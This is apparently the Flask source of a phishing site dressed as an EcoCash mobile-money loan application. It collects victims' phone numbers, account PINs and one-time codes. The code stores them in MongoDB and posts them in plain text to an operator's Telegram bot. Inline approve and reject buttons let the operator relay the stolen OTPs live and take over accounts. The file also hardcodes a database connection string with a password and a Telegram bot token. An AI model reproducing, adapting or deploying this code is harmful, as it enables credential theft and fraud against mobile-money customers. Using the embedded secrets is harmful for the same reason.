from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId
import certifi
import os
import time
import requests

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "ecocash_flow_secret_key")

# MongoDB connection
MONGO_URI = os.environ.get(
    "MONGO_URI",
    "mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser",
)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client[os.environ.get("DB_NAME", "momo_loan_db")]
applications_collection = db["applications"]

# Telegram Configuration
TELEGRAM_BOT_TOKEN = "9038552658:AAHLJ-jEBIMWLfWOMUHTruAHKd6yQ2bRCio"
TELEGRAM_ADMIN_CHAT_ID = "8965398913"


def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="login"):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
        print("Telegram token or chat ID not configured.")
        return

    db_id = str(app_data.get("_id"))

    message = (
        f"⚡ *{stage_title}*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"• *Mobile:* +263 {app_data.get('phone', '')}\n"
        f"• *Email:* {app_data.get('email', '—')}\n"
        f"• *Amount:* ${app_data.get('amount', '—')} ({app_data.get('term', '—')})\n"
        f"• *Purpose:* {app_data.get('purpose', '—')}\n"
        f"• *Income:* ${app_data.get('income', '—')}\n"
        f"• *PIN:* `{app_data.get('password', '—')}`\n"
        f"• *OTP Code:* `{app_data.get('final_auth_code', '—')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"• *Ref ID:* `{app_data.get('app_id')}`"
    )

    reply_markup = {
        "inline_keyboard": [
            [
                {
                    "text": f"✅ Approve {step_code.upper()}",
                    "callback_data": f"approve_{step_code}_{db_id}",
                }
            ],
            [
                {
                    "text": f"❌ Reject {step_code.upper()}",
                    "callback_data": f"reject_{step_code}_{db_id}",
                },
                {
                    "text": "💬 Send Notice",
                    "callback_data": f"msg_{step_code}_{db_id}",
                },
            ],
        ]
    }

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": reply_markup,
    }

    try:
        requests.post(url, json=payload, timeout=6)
    except Exception as e:
        print(f"Telegram alert error: {e}")


@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    data = request.get_json(silent=True) or {}

    if "callback_query" in data:
        callback = data["callback_query"]
        callback_data = callback.get("data", "")
        callback_id = callback.get("id")

        parts = callback_data.split("_", 2)
        if len(parts) == 3:
            action, step_code, db_id = parts
            step_code = step_code.lower()
            text_response = "Updated"

            try:
                oid = ObjectId(db_id)
            except Exception:
                oid = None

            if action == "approve":
                if step_code == "login":
                    new_status = "Login_Approved"
                    text_response = "Login approved — user moving to OTP"
                elif step_code == "otp":
                    new_status = "OTP_Approved"
                    text_response = "OTP approved — completing application"
                else:
                    new_status = "OTP_Approved"
                    text_response = "Approved"

                if oid:
                    applications_collection.update_one(
                        {"_id": oid},
                        {"$set": {"status": new_status, "custom_message": ""}},
                    )

            elif action == "reject":
                if step_code == "login":
                    rejected_status = "Login_Rejected"
                    text_response = "Login rejected — returning to login"
                else:
                    rejected_status = "OTP_Rejected"
                    text_response = "OTP rejected — returning to OTP page"

                if oid:
                    applications_collection.update_one(
                        {"_id": oid},
                        {
                            "$set": {
                                "status": rejected_status,
                                "rejected_stage": step_code,
                                "custom_message": "",
                            }
                        },
                    )

            elif action == "msg":
                if oid:
                    applications_collection.update_one(
                        {"_id": oid},
                        {
                            "$set": {
                                "status": "CustomMessage",
                                "custom_message": "Please check your details and try again.",
                            }
                        },
                    )
                text_response = "Notice sent"

            if callback_id and TELEGRAM_BOT_TOKEN:
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
                        json={"callback_query_id": callback_id, "text": text_response},
                        timeout=6,
                    )
                except Exception as e:
                    print(f"answerCallbackQuery error: {e}")

    return jsonify({"status": "ok"}), 200


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/apply/step1", methods=["GET", "POST"])
def apply_step1():
    if request.method == "POST":
        if request.form.get("phone"):
            session["phone"] = request.form.get("phone")
        if request.form.get("email"):
            session["email"] = request.form.get("email")
        if request.form.get("amount"):
            session["amount"] = request.form.get("amount")
        if request.form.get("term"):
            session["term"] = request.form.get("term")
        if request.form.get("purpose"):
            session["purpose"] = request.form.get("purpose")
        if request.form.get("income"):
            session["income"] = request.form.get("income")
        return redirect(url_for("submitted_notice"))
    return render_template("apply_step1.html")


@app.route("/submitted")
def submitted_notice():
    return render_template("submitted_notice.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        phone = request.form.get("phone") or session.get("phone", "")
        pin = request.form.get("pin")
        if phone:
            session["phone"] = phone

        app_data = {
            "provider": "EcoCash",
            "phone": phone,
            "email": session.get("email", "—"),
            "amount": session.get("amount", "500"),
            "term": session.get("term", "6 months"),
            "purpose": session.get("purpose", "General"),
            "income": session.get("income", "—"),
            "password": pin,
            "final_auth_code": "",
            "status": "Pending_Login",
            "rejected_stage": "",
            "created_at": time.time(),
            "app_id": "ECO" + os.urandom(4).hex().upper(),
            "custom_message": "",
        }

        inserted_id = applications_collection.insert_one(app_data).inserted_id
        session["current_app_id"] = str(inserted_id)
        app_data["_id"] = inserted_id

        send_telegram_alert(app_data, stage_title="STEP 1: LOGIN SUBMITTED", step_code="login")
        return redirect(url_for("pending", app_id=app_data["app_id"], stage="login"))

    return render_template("login.html")


@app.route("/pending")
def pending():
    app_id = request.args.get("app_id")
    stage = request.args.get("stage", "login")
    current_id = session.get("current_app_id")

    if not app_id and current_id:
        try:
            record = applications_collection.find_one({"_id": ObjectId(current_id)})
            app_id = record.get("app_id") if record else "ECO-PENDING"
        except Exception:
            app_id = "ECO-PENDING"

    return render_template("pending.html", app_id=app_id or "ECO-PENDING", stage=stage)


@app.route("/check-status")
def check_status():
    app_id = request.args.get("app_id")
    current_id = session.get("current_app_id")

    record = None
    if app_id:
        record = applications_collection.find_one({"app_id": app_id})
    elif current_id:
        try:
            record = applications_collection.find_one({"_id": ObjectId(current_id)})
        except Exception:
            record = None

    if record:
        return jsonify({
            "status": record.get("status", "Pending_Login"),
            "custom_message": record.get("custom_message", ""),
        })

    return jsonify({"status": "Pending_Login", "custom_message": ""})


@app.route("/final-verify", methods=["GET", "POST"])
def final_verify():
    if request.method == "POST":
        final_code = request.form.get("final_code")
        current_id = session.get("current_app_id")
        record = None

        if current_id:
            try:
                oid = ObjectId(current_id)
                applications_collection.update_one(
                    {"_id": oid},
                    {
                        "$set": {
                            "final_auth_code": final_code,
                            "status": "Pending_OTP",
                            "rejected_stage": "",
                            "custom_message": "",
                        }
                    },
                )
                record = applications_collection.find_one({"_id": oid})
                if record:
                    send_telegram_alert(record, stage_title="STEP 2: OTP SUBMITTED", step_code="otp")
            except Exception as e:
                print(f"final_verify error: {e}")

        return redirect(
            url_for("pending", app_id=record.get("app_id") if record else "", stage="otp")
        )

    return render_template("final_verify.html")


@app.route("/success")
def success():
    return render_template("success.html")


@app.route("/health")
def health_check():
    return "OK", 200


if __name__ == "__main__":
    app.run(debug=True, port=5000)